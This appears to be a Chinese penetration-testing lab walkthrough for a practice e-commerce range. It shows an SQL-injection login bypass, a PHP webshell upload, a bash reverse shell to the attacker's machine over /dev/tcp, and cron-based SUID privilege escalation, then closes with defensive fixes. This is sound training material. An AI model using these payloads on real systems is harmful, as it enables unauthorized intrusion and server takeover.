---
日期: 2026-08-17
靶场: Sunrise-Harbor 商城靶场
难度: ⭐ 入门
核心考点: SQL注入万能钥匙 / 文件上传GetShell / 定时任务提权
通关状态: ✅ 通关
靶机IP: 192.168.0.111（DHCP动态分配，每次不同）
root密码: 147258xxxwww
---

# Sunrise-Harbor 商城靶场

> 仿早期 SQL 注入 + 上传漏洞的基础靶场，无 WAF、无防护策略，考基础渗透技能。
> 完整链路：**信息收集 → SQL注入万能钥匙 → 后台发现 → 上传木马 → 反弹Shell → 定时任务提权 → root**

## 🎯 靶场信息

| 项目 | 内容 |
|------|------|
| 类型 | 仿早期 SQL 注入 + 上传漏洞靶场 |
| 难度 | ⭐ 入门 |
| 防护 | 无防火墙拦截 |
| 网络模式 | 桥接（靶机 DHCP 自动分配 IP，与 Kali 同网段） |
| 通关链路 | SQL注入 → 后台 → 上传 → getshell → 提权 |

---

## 📁 Stage 1: 信息收集

### 1.1 主机发现

靶机为桥接模式，会自动在当前网络中找一个空闲 IP，与 Kali 同网段（`192.168.0.x`）。

```bash
# 确认自己的 IP
ip a                    # linux
ipconfig                # windows

# 扫描网段发现靶机
nmap -sn 192.168.0.0/24
```

结果分析：
```
Nmap scan report for 192.168.0.1
MAC Address: 9C:47:82:C4:38:A6 (TP-Link)          ← 路由器，排除

Nmap scan report for 192.168.0.102
MAC Address: 50:C2:E8:F5:4E:03 (Cloud Network Technology Singapore PTE.)  ← 非本网常见设备，锁定为靶机
```

⚠️ **注意**：IP 是 DHCP 动态分配的，每次启动可能不同，不要照抄命令。

### 1.2 端口扫描

```bash
nmap -p- 192.168.0.111
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin
```

| 端口 | 服务 | 判断 |
|------|------|------|
| 22 | ssh | SSH 远程登录 |
| 80 | http | 前台 Web 页面（商城） |
| 9090 | zeus-admin | 疑似后台/隐藏服务 |

访问 80 端口 → 商城页面，确认探测正确。

---

## 🕳️ Stage 2: 漏洞发现 —— SQL 注入

### 2.1 漏洞扫描

用 wapiti 扫描（或任意扫描器）：

```bash
apt install wapiti
wapiti -u http://192.168.0.111
# 结果生成在 /root/.wapiti/generated_report/
```

扫描发现大量 SQL 注入漏洞。

### 2.2 万能钥匙登录（核心考点）

在登录框输入万能钥匙绕过认证：

```
admin' or 1=1 #
```

**原理拆解**：

正常登录，后台查询语句：
```sql
select * from user where username='xxx' and password='xxx'
```

注入后语句变成：
```sql
select * from user where username='admin' or 1=1 # ' and password='xxx'
```

拆解：
1. `admin'` → **单引号闭合**前面的字符串，让后面的内容变成可执行 SQL
2. `or 1=1` → `or` 只要有一个条件成立就返回真，`1=1` 恒为真 → **整个条件恒真**
3. `#` → **注释符**，把后面 `' and password='xxx'` 全部注释掉

**布尔逻辑回顾**：
```
and:  正确 and 正确 = 正确    ← 必须都正确
      正确 and 错误 = 错误
or:   正确 or 错误 = 正确      ← 一个对就赢
      错误 or 错误 = 错误
```

所以只要猜对用户名（常见 `admin`），密码随便填，即可登录。

> 💡 **为什么不用 sqlmap？** sqlmap 最终目的是跑出管理员账号密码，万能钥匙已经直接登录了，不需要再跑。

---

## ⚔️ Stage 3: 漏洞利用 —— 后台 + 上传 GetShell

### 3.1 后台发现（脑经急转弯）

在 80 端口怎么扫都没有后台。后台隐藏方式有三种常见手法：

1. **同端口**：路由 / 路径隐藏
2. **不同端口**：不同端口放不同服务  ← 本题
3. **域名分割**

9090 端口直接访问看着还是前台页面（故意部署了前台文件混淆），**后台藏在里面**：

```
http://192.168.0.111:9090/admin
```

常见后台路径：`admin` / `admin.php` / `manager` ...

进入后台后同样用万能钥匙登录。

### 3.2 上传木马

后台有上传点（很明显），直接上传一句话木马：

```php
<?php system($_GET['cmd']); ?>
```

保存为 `x.php` 上传。上传后访问：

```
http://192.168.0.111:9090/uploads/20260622/1782116258_x.php?cmd=id
```

参数 `cmd=id` 执行命令成功，确认 getshell。

> 💡 上传时按 **F12 → Network** 观察请求是否报错，方便排查。

### 3.3 反弹 Shell

Web 上执行命令不方便，反弹 shell 到 Kali 终端：

```bash
# kali 监听 4444
nc -lvnp 4444
```

反弹命令需要 **URL 编码**（特殊符号会被浏览器转义）：

```
http://192.168.0.111:9090/uploads/20260622/1782116258_x.php?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F<KALI_IP>%2F4444%20%3C%261%27
```

解码后实际是：
```bash
bash -c 'exec bash -i &>/dev/tcp/<KALI_IP>/4444 <&1'
```

Kali 终端收到回连：
```
connect to [192.168.0.104] from (UNKNOWN) [192.168.0.111] 38530
www-data@ubuntu:/var/www/sunrise-harbor/uploads/20260622$
```

✅ **获得 Web 权限（www-data）**

---

## 🚀 Stage 4: 提权 —— 定时任务 + 777 脚本

### 4.1 确认当前权限

```bash
whoami
# www-data
```

是 web 权限，不能完全控制服务器 → 继续提权。

### 4.2 发现提权点

```bash
cat /etc/crontab
```

发现定时任务：
```
* * * * * root /opt/maintenance/backup_logs.sh
```

**提权思路**：该脚本以 **root 权限** 每分钟执行。如果当前用户对该脚本有**写权限**，就可以修改它 → root 会执行我们的恶意命令。

检查脚本权限：

```bash
ls -la /opt/maintenance/backup_logs.sh
# -rwxrwxrwx 1 777 www-data ...   ← 777 权限！
```

**关键条件成立**：
- ✅ 脚本由 **root** 执行
- ✅ 脚本权限 **777**（所有用户可写）

### 4.3 提权利用

覆盖脚本内容，给 `/bin/bash` 加 SUID 权限：

```bash
echo 'chmod +s /bin/bash' > /opt/maintenance/backup_logs.sh
```

等定时任务执行（约 1 分钟），然后：

```bash
/bin/bash -p
id
# uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

✅ **提权成功，获得 root 权限**

> 💡 `chmod +s` 给 `/bin/bash` 设置 SUID，`-p` 保留 euid（effective user id）为 root。

---

## 📝 Stage 5: 总结

### 考点回顾

- [x] **信息收集**：桥接模式下用 nmap 扫网段找靶机，分辨路由器/靶机（MAC 厂商）
- [x] **SQL注入万能钥匙**：`admin' or 1=1 #` 原理（单引号闭合 + or恒真 + 注释）
- [x] **后台隐藏手法**：不同端口放不同服务，后台在 9090/admin
- [x] **文件上传 GetShell**：一句话木马 `<?php system($_GET['cmd']); ?>`
- [x] **反弹 Shell**：URL 编码绕过转义，`bash -i &>/dev/tcp/IP/PORT`
- [x] **定时任务提权**：root 定时执行 + 777 可写脚本 → 植入 `chmod +s /bin/bash` → `bash -p` 提权

### 踩坑记录

- ⚠️ 靶机 IP 是 **DHCP 动态分配**，每次启动不同，务必以 `nmap -sn` 实际扫描结果为准
- ⚠️ 反弹 shell 命令**特殊符号会被浏览器转义**，必须先 URL 编码再访问
- ⚠️ 后台在 **9090 端口**而非 80，只在 80 扫目录会一直找不到后台

### 防御思路

| 漏洞 | 防御方案 |
|------|---------|
| SQL注入 | 参数化查询（Prepared Statement）、输入校验、WAF |
| 万能钥匙 | 后端用参数绑定，禁用拼字符串 SQL |
| 文件上传 | 校验文件类型/内容、白名单扩展名、重命名、上传目录禁止执行脚本 |
| 一句话木马 | 限制上传目录权限、禁用 `system`/`exec` 危险函数 |
| 定时任务提权 | 脚本不用 777 权限、脚本归属 root 且仅 root 可写、监控 crontab 变更 |
